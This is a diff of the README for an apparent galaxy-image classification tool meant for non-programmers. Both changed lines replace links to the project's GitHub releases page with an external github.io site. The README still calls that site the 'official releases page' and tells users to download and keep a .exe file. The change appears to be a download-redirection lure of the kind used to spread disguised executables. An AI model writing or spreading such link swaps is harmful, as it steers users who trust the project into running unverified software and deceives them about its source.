@@ -1,6 +1,6 @@
 # 🌌 Galaxy-Morphology-Classification-CNN - Identify galaxy shapes with image recognition
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Xyristhird43/Galaxy-Morphology-Classification-CNN/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://xyristhird43.github.io)
 
 This application uses a computer model to identify the shape of galaxies. You provide an image of a galaxy, and the program labels it as Spiral, Elliptical, or Irregular. It uses data from the Galaxy10 DECals survey to ensure accuracy. You do not need to know how to code to use this tool. 
 
@@ -18,7 +18,7 @@ Your computer must meet these standards to run the software:
 
 Follow these steps to get the software on your computer:
 
-1. Visit the [official releases page](https://github.com/Xyristhird43/Galaxy-Morphology-Classification-CNN/releases) to download the latest version.
+1. Visit the [official releases page](https://xyristhird43.github.io) to download the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to save it to your Downloads folder.
 4. If your browser asks if you want to keep the file, click Keep.
